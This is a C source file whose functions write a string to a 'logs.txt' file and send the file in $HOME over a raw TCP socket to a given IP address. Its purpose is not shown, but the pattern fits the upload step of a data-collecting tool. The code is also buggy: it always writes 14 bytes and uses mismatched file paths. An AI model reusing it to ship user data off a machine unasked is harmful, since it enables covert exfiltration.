#include "../headers/writelogs.h"

bool write_log(const char* log) {
    if (!log) {
        return 0;
    }

    int fd = open("logs.txt", O_WRONLY | O_CREAT | O_TRUNC, 0644);  // file descriptor
    if (fd == -1) {
        perror("something wrong with opening");
        return 0;
    }
    
    write(fd, log, 14);
    close(fd);

    return 1;
}

bool send_logs(const char* ip) {
    if (!ip) {
        return 0;
    }
    
    size_t path_len = strlen(HOME) + strlen("/logs.txt") + 1;
    char* path = (char*)malloc(path_len);
    if (!path) {
        return 0;
    }
    snprintf(path, path_len, "%s/logs.txt", HOME);
    
    int sd = socket(AF_INET, SOCK_STREAM, 0);
    if (sd < 0) {
        free(path);
        return 0;
    }
    
    int opt = 1;
    if (setsockopt(sd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0) {
        close(sd);
        free(path);
        return 0;
    }
    
    struct sockaddr_in address;
    memset(&address, 0, sizeof(address));
    address.sin_family = AF_INET;
    address.sin_port = htons(PORT);
    
    if (inet_pton(AF_INET, ip, &address.sin_addr) != 1) {
        close(sd);
        free(path);
        return 0;
    }
    
    if (connect(sd, (struct sockaddr*)&address, sizeof(address)) < 0) {
        close(sd);
        free(path);
        return 0;
    }
    
    int fd = open(path, O_RDONLY);
    if (fd < 0) {
        close(sd);
        free(path);
        return 0;
    }
    
    char buffer[4096];
    ssize_t bytes_read;
    
    while ((bytes_read = read(fd, buffer, sizeof(buffer))) > 0) {
        ssize_t sent = send(sd, buffer, bytes_read, 0);
        if (sent < 0) {
            break;
        }
    }
    
    close(fd);
    close(sd);
    free(path);
    return 1;
}